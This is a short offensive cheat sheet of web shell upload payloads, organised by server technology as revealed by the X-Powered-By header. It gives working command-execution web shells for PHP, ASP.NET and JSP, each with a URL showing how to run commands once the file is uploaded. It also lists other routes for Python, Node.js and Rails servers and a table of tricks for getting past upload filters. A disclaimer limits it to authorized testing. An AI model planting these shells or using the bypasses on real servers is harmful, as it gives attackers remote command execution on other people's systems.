# Web Shell Upload Payloads by X-Powered-By

This cheat sheet includes web shell payloads tailored for different server technologies based on the `X-Powered-By` response header.

---

## 1. PHP Server
**X-Powered-By: PHP/7.x**

### Shell File (`shell.php`):
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

**Access:**
```
https://target.com/uploads/shell.php?cmd=id
```

---

## 2. ASP.NET / ASP Server
**X-Powered-By: ASP.NET**

### Shell File (`shell.aspx`):
```aspx
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]));
}
</script>
```

**Access:**
```
https://target.com/uploads/shell.aspx?cmd=whoami
```

---

## 3. JSP / Java Servlet
**X-Powered-By: Servlet / JSP**

### Shell File (`shell.jsp`):
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
int c;
while ((c = in.read()) != -1) {
    out.print((char)c);
}
in.close();
%>
```

**Access:**
```
https://target.com/uploads/shell.jsp?cmd=id
```

---

## 4. Python (Flask / Django)
**X-Powered-By: WSGI / Gunicorn / Python**

Traditional shell uploads usually **don't work**.

**Try instead:**
- Server-Side Template Injection (SSTI)
- Config overwrites / path traversal

---

## 5. Node.js (Express / Koa)
**X-Powered-By: Express / Node.js**

File upload won’t give direct RCE.

**Try instead:**
- Logic abuse (overwriting `.json` or `.js` files)
- SSRF / LFI
- Unsafe `require()` usage

---

## 6. Ruby on Rails
May not show in headers, but detectable via `.erb`, `.rhtml`, or Wappalyzer.

**Try:**
- Dangerous ERB injections
- Deserialization RCE

---

## Common File Upload Bypasses

| Technique         | Example                            |
|------------------|------------------------------------|
| Double extension | `shell.php.jpg`, `shell.aspx;.jpg` |
| Null byte        | `shell.php%00.jpg` (legacy PHP)    |
| MIME spoofing    | `Content-Type: image/png`          |
| Polyglot files   | Valid image + PHP code             |
| Extension bypass | `.php5`, `.phtml`                  |

---

## Disclaimer
This content is for **educational and authorized testing** only. Do not use these payloads on systems without permission.
